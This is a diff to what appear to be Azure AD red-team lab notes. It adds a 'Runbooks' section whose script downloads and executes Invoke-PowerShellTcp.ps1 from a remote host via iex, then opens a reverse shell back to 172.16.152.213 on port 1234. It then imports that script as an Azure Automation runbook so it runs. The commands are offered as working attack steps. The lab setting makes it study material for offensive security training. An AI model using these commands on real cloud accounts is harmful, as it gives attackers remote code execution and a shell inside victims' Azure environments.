@@ -243,6 +243,14 @@ Invoke-EnumerateAzureBlobs -Base defcorp
 
 ## Runbooks
 
+#### Prepare code for runbook
+Create script to be executed via runbook, remember to host TCPConnect.ps1:
+```
+iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Invoke-PowerShellTcp.ps1")
+Power -Reverse -IPAddress 172.16.152.213 -Port 1234
+```
+
+#### Create and Execute runbook
 ```
 Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
 ```
